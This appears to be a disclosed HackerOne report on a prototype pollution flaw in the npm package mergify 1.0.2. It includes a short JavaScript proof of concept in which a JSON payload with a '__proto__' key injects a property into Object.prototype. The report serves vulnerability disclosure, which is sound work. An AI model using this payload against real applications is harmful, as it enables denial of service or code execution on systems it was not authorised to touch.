# Prototype pollution attack (mergify)

## Report Details
- **Report ID**: 439098
- **URL**: https://hackerone.com/reports/439098
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-11-11T13:39:30.613Z
- **Disclosed**: 2018-11-20T12:04:14.262Z

## Reporter
- **Username**: dienpv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi team,
I would like to report a prototype pollution vulnerability in mergify
that allows an attacker to inject properties on Object.prototype.

# Module

**module name:** mergify
**version:** 1.0.2
**npm page:** `https://www.npmjs.com/package/mergify`

## Module Description

> Merge objects deeply

# Vulnerability

## Vulnerability Description

> this vulnerability type is similar to my report  #438274
mergify is vulnerable when it performs a recursive copy of the specified objects.

## Steps To Reproduce:

> In the following code snippet, "payload" would come from user-input (JSON data).
```javascript
var mergify= require('mergify');
var payload = '{"__proto__":{"polluted":"mergify_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
mergify({},JSON.parse(payload));
console.log("After: ", test.polluted);

# Wrap up
- I contacted the maintainer to let them know: [Y/N] 
- I opened an issue in the related repository: [Y/N] 

Thanks!

## Impact

It causes Denial of Service or RCE in some cases.

## Attachments
No attachments
